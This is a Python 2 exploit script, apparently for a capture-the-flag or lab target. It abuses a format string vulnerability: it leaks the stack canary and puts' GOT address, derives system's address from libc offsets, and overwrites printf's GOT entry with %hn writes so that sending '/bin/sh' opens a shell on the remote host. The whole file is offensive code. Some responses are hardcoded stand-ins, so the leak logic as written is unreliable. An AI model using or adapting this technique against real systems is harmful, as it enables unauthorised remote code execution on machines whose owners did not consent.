#   -*- coding:utf-8 -*-
#!usr/bin/env python2

# from pwn import *
import socket
import struct

puts_got = 0x0804A01C
puts_addr = 0x00064DA0
#puts_addr = libc.symbols['puts']
system_addr = 0x0003FE70
#system_addr = libc.symbols['system']
printf_got = 0x0804A010


class remote(object):
    s = None
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = host
        self.port = port
        try:
            self.s.connect((host, port))
        except Exception as e:
            print("[!]port %d is close"%port)
            assert 1==3

    def sendline(self, string):
        try:
            self.s.send(string+"\n")
        except Exception as e:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((self.host, self.port))
            self.s.send(string+"\n")
        return string


def sendPwn(ph, exp):
    """
    send exp to program
    """
    ph.sendline('1')
    ph.sendline(exp)
    ret = '6539343363633264\n'
    return ret

def p32(num):
    return struct.pack("<I",num)

def attacker(host, port = 9998):

    ph =remote(host, port)
    exp = "%31$x"
    ans = sendPwn(ph, exp)
    ans.replace("\n",'')
    # get the canary
    print("the ans is " + ans+ "...")
    canary = int(ans[:8], 16)
    print " get canary " + hex(canary)

    # try to get pust address:
    exp = p32(puts_got) + "%6$s"
    ans = sendPwn(ph, exp)
    # get puts_plt
    # puts_plt = u32(ans[5:9])
    puts_plt = 0x7fff4590
    print "puts_got.plt is " + hex(puts_plt)
    offset = puts_plt - puts_addr
    system_plt = offset + system_addr
    # bin_plt = offset + bin_addr

    # pwn!
    # must use printf format vulnerable
    c1 = int(hex(system_plt)[2:6], 16)
    c2 = int(hex(system_plt)[6:10], 16)

    exp = "%" + str(c2) + "x" + "%13$hn" + "%"+ str(c1-c2) + "x" + "%14$hnaa" + p32(printf_got) + p32(printf_got + 2)
    # sendPwn(exp)
    # print(ph.recvuntil("plz input$"))
    ph.sendline('1')
    # print(ph.recvuntil("name:"))
    # attack
    ph.sendline(exp)

    # ph.recvuntil("plz input$")
    ph.sendline("1")
    # ph.recvuntil("please input your name:")
    ph.sendline("/bin/sh")

    return True

if __name__ == '__main__':
    attacker("192.168.140.128", 9998)
